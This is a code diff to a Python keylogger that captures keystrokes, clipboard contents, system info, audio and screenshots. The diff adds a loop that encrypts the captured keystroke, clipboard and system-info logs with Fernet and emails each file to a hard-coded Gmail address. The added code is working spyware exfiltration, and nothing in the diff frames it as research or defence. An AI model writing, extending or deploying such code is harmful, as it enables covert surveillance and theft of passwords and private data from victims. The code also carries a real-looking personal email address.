@@ -39,6 +39,10 @@ clipboard_info = "clipboard.txt"
 audio_info = "audio.wav"
 screenshot_info = "screenshot.png"
 
+e_keys = "e_key_log.txt"
+e_sys_info = "e_sysInfo.txt"
+e_clipboard_info = "e_clipboard.txt"
+
 mic_time = 10
 
 time_iteration = 15
@@ -53,6 +57,7 @@ toaddr = "divkirnapure7@gmail.com"
 
 file_path = "C:\\me\\python"
 extend = "\\"
+file_merge = file_path + extend
 
 
 # adding email functionality
@@ -238,3 +243,27 @@ while number_of_iterations < number_of_iterations_end:
 
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
+
+
+# encrypting files 
+
+files_to_encrypt = [file_merge + sys_info, file_merge + clipboard_info, file_merge + key_info]
+encrypted_file_names = [file_merge + e_sys_info, file_merge + e_clipboard_info, file_merge + e_keys]
+
+file_count = 0
+
+for file in files_to_encrypt:
+
+    with open(files_to_encrypt[file_count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encrypted_file_names[file_count], 'wb') as f:
+        f.write(encrypted)
+
+    send_email(encrypted_file_names[file_count], encrypted_file_names[file_count], toaddr)
+    file_count += 1
+
+time.sleep(120)
